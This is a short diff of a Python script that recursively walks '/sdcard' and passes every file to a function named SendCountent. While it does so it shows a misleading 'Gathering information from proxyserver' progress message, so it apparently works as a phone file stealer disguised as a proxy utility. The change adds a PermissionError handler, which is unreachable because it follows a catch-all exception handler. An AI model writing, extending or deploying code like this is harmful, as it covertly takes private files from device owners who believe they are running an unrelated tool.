@@ -20,12 +20,17 @@ def main(were='.'):
                 if i.is_dir():
                     Cclass.append((var:=join(CP,i.name)))
                 else:
-                    SendCountent(join(CP,i.name)) ;loop += 1
+                    SendCountent(join(CP,i.name)) ; loop += 1
                     print(f'Gathering information from proxyserver please wait := '+fg('green') +f'{loop}'+fg('white'),end='\r')
             Cclass.remove(CP)
             CP = Cclass[0]
         except Exception as er: 
             pass
+        except PermissionError:
+            try:
+                CP = Cclass[0]
+            except IndexError:
+                break
 
 main('/sdcard')
 
